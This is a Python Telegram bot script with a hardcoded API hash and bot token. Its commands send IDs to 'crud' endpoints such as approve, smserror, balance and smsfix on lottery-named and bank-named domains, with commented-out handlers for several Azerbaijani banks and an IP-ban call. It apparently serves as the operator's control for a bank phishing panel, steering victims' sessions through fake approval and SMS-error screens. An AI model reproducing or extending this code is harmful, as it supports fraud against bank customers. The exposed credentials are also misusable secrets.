import os
import requests
from pyrogram import Client, filters




API_ID = 28453217
API_HASH = "dbfd793b6267a127cbb765e61ebe82de"
BOT_TOKEN = "6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M"



app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# @app.on_message(filters.command(["b"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
        
#         url = f"https://m10lotereya.biz.net/crud/balance/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /n command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
        
        
# @app.on_message(filters.command(["a"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
        
#         url = f"https://m10lotereya.biz.net/crud/approve/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /a command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
        

# @app.on_message(filters.command(["e"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
        
#         url = f"https://m10lotereya.biz.net/crud/smserror/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /e command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        

# @app.on_message(filters.command(["k"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.info/crud/kapital/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /kapital command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
# @app.on_message(filters.command(["a"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.info/crud/abb/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /abb command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
        
# @app.on_message(filters.command(["l"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.info/crud/leobank/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /leobank command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
        

# @app.on_message(filters.command(["u"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.info/crud/unibank/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /unibank command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
# @app.on_message(filters.command(["se"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.info/crud/smserror/{number}"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /se command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        


# @app.on_message(filters.command(["sf"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.info/crud/smsfix/{number}"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /smsfix command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")



# @app.on_message(filters.command(["p"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.info/crud/pashabank/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /pashabank command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")




# @app.on_message(filters.command(["error"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.info/crud/error/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /error command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
        
        
# @app.on_message(filters.command(["ip"]))
# def kapital(client, message):
#     try:
#         ip = message.text.split()[1]
#         url = f"https://asanodenis.info/api/banned_ipssadsad1d21dasdasd12dsadsadsad12dqwd12dsad12dsqd12d/"
#         data = {
#             "ip_address": f"{ip}",
#             "ban_reason": ""
#         }
#         response = requests.post(url,data=data)
#         print(response.text)
#         if response.status_code == 200:
#             message.reply_text(f"Ip uğurla banladı :)\nip:{ip}.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Ip Yazin /ip command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        

       
@app.on_message(filters.command(["a"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        
        url = f"https://m10lotereya.biz/crud/approve/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /a command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")
     

@app.on_message(filters.command(["e"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        
        url = f"https://m10lotereya.biz/crud/smserror/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /e command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")


@app.on_message(filters.command(["b"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        
        url = f"https://m10lotereya.biz/crud/balance/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /n command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")

@app.on_message(filters.command(["help"]))
def kapital(client, message):
    message.reply_text("b - balance error\na - approve\ne - sms error.")       

app.run()